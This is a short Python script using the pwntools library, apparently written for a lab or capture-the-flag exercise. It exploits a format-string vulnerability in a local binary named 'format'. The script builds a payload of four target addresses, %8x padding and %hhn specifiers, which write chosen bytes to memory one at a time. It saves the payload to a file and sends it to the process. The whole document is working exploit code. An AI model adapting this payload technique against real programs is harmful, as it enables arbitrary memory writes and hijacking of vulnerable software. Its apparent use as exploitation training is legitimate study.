from pwn import *

# context.log_level = "debug"

p = process("./2Format-String/format")

payload = b""
payload += 0x804a02c.to_bytes(4, 'little')
payload += 0x804a02d.to_bytes(4, 'little')
payload += 0x804a02e.to_bytes(4, 'little')
payload += 0x804a02f.to_bytes(4, 'little')
payload += b"%8x" * 11
payload += b" " * 13
payload += b"%hhn"
payload += b" " * 3
payload += b"%hhn"
payload += b" " * 205
payload += b"%hhn"
payload += b" " * 31
payload += b"%hhn"

with open('format-payload.txt', 'wb') as f:
    f.write(payload)
    print(payload)

# pause()
p.sendline(payload)
p.interactive()